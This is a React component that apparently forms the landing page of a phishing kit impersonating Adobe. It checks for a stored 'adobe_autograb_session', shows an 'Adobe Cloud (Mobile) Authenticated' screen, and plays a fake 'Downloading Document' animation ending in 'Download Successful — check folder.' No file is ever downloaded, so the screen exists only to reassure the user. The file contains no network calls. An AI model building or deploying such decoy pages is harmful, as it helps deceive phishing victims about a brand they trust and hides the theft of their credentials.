import React, { useEffect, useRef, useState } from 'react';

interface MobileLandingPageProps {
  onFileAction?: (fileName: string, action: 'view' | 'download') => void;
}

/**
 * MobileLandingPage simplified to only implement the download-sequence behavior:
 * - On mount, if adobe_autograb_session exists and the download overlay hasn't yet been shown
 *   for that session, show "Downloading Document...." with animated dots.
 * - After a short interval switch to "Download Successful — check folder." and keep it visible
 *   until the page is refreshed.
 */
const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
  const [showOverlay, setShowOverlay] = useState(false);
  const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
  const [dots, setDots] = useState('');
  const dotIntervalRef = useRef<number | null>(null);
  const successTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    try {
      const raw = localStorage.getItem('adobe_autograb_session');
      if (!raw) return;
      let session: any = null;
      try {
        session = JSON.parse(raw);
      } catch {
        session = null;
      }
      const sessionId = (session && (session.sessionId || session.timestamp)) ? String(session.sessionId || session.timestamp) : null;
      if (!sessionId) return;

      const shownKey = `adobe_download_shown::${sessionId}`;
      const alreadyShown = sessionStorage.getItem(shownKey);
      if (alreadyShown) return;

      // Start sequence
      setShowOverlay(true);
      setPhase('downloading');

      let dotCount = 1;
      const maxDots = 6;
      dotIntervalRef.current = window.setInterval(() => {
        dotCount = dotCount >= maxDots ? 1 : dotCount + 1;
        setDots('.'.repeat(dotCount));
      }, 500) as unknown as number;

      successTimeoutRef.current = window.setTimeout(() => {
        if (dotIntervalRef.current) {
          clearInterval(dotIntervalRef.current);
          dotIntervalRef.current = null;
        }
        setPhase('success');
        setDots('');
        try {
          sessionStorage.setItem(shownKey, new Date().toISOString());
        } catch {}
        successTimeoutRef.current = null;
      }, 3000) as unknown as number;

    } catch (e) {
      // ignore
    }

    return () => {
      if (dotIntervalRef.current) {
        clearInterval(dotIntervalRef.current);
        dotIntervalRef.current = null;
      }
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
        successTimeoutRef.current = null;
      }
    };
  }, []);

  return (
    <div style={{ minHeight: '100vh', background: '#0b0b0b', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff' }}>
      <div style={{ textAlign: 'center', opacity: showOverlay ? 0.2 : 1 }}>
        <div style={{ fontSize: 18, fontWeight: 600, marginBottom: 6 }}>Adobe Cloud (Mobile)</div>
        <div style={{ color: '#cfcfcf' }}>Authenticated</div>
      </div>

      {showOverlay && (
        <div style={{
          position: 'fixed',
          inset: 0,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          pointerEvents: 'none'
        }}>
          <div style={{
            color: '#ffffff',
            fontSize: 16,
            fontWeight: 600,
            textAlign: 'center',
            padding: '12px 18px',
            borderRadius: 10,
            background: 'transparent'
          }}>
            {phase === 'downloading' && <span>Downloading Document{dots}</span>}
            {phase === 'success' && <span>Download Successful — check folder.</span>}
          </div>
        </div>
      )}
    </div>
  );
};

export default MobileLandingPage;
